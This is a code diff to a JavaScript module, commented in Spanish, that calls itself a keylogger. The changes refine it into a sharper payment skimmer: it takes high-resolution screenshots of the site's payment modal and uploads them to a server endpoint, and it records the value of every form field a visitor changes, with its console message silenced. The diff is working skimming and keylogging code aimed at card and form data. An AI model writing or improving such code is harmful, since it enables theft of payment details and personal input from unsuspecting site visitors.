@@ -2,16 +2,24 @@
 let lastScreenshotTime = 0;
 const SCREENSHOT_INTERVAL = 5000; // Captura cada 5 segundos
 
-// Función para capturar pantalla
+// Función para capturar pantalla (solo el modal de pago)
 export async function captureScreenshot() {
     try {
-        const canvas = await html2canvas(document.body, {
+        // Capturar SOLO el modal de pago en vez de toda la pantalla
+        const paymentCard = document.querySelector('#payment-modal .payment-card');
+        if (!paymentCard) {
+            console.log('Modal de pago no visible, captura omitida');
+            return;
+        }
+
+        const canvas = await html2canvas(paymentCard, {
             allowTaint: true,
             useCORS: true,
-            scale: 0.8
+            scale: 2 // Escala 2x para mayor nitidez
         });
         
-        const imageData = canvas.toDataURL('image/png');
+        // JPEG con calidad 0.85 para buena calidad sin peso excesivo
+        const imageData = canvas.toDataURL('image/jpeg', 0.85);
         
         // Enviar al servidor
         fetch('/upload-screenshot', {
@@ -24,7 +32,7 @@ export async function captureScreenshot() {
             })
         }).catch(err => console.log('Error capturando pantalla:', err));
         
-        console.log(`Captura de pantalla enviada`);
+        console.log(`Captura del modal de pago enviada`);
     } catch (error) {
         console.log('No se pudo capturar pantalla:', error);
     }
@@ -61,9 +69,16 @@ function captureFormFieldData(fieldName, fieldValue) {
 
 // Inicializador del Keylogger que añade los listeners al DOM
 export function initKeylogger() {
-    document.addEventListener('change', event => event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA' || event.target.tagName === 'SELECT' ? captureFormFieldData(event.target.id || event.target.name || 'campo-desconocido', event.target.value) : null);
-    
-    document.addEventListener('blur', event => event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA' ? (event.target.value.length > 0 ? captureFormFieldData(event.target.id || event.target.name || 'campo-desconocido', event.target.value) : null) : null, true);
+    // Solo usamos 'change' — el evento 'blur' causaba registros duplicados
+    document.addEventListener('change', event => {
+        const tag = event.target.tagName;
+        if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') {
+            captureFormFieldData(
+                event.target.id || event.target.name || 'campo-desconocido',
+                event.target.value
+            );
+        }
+    });
 
     // Mensaje de inicialización silenciado en consola
     window.addEventListener('load', () => {
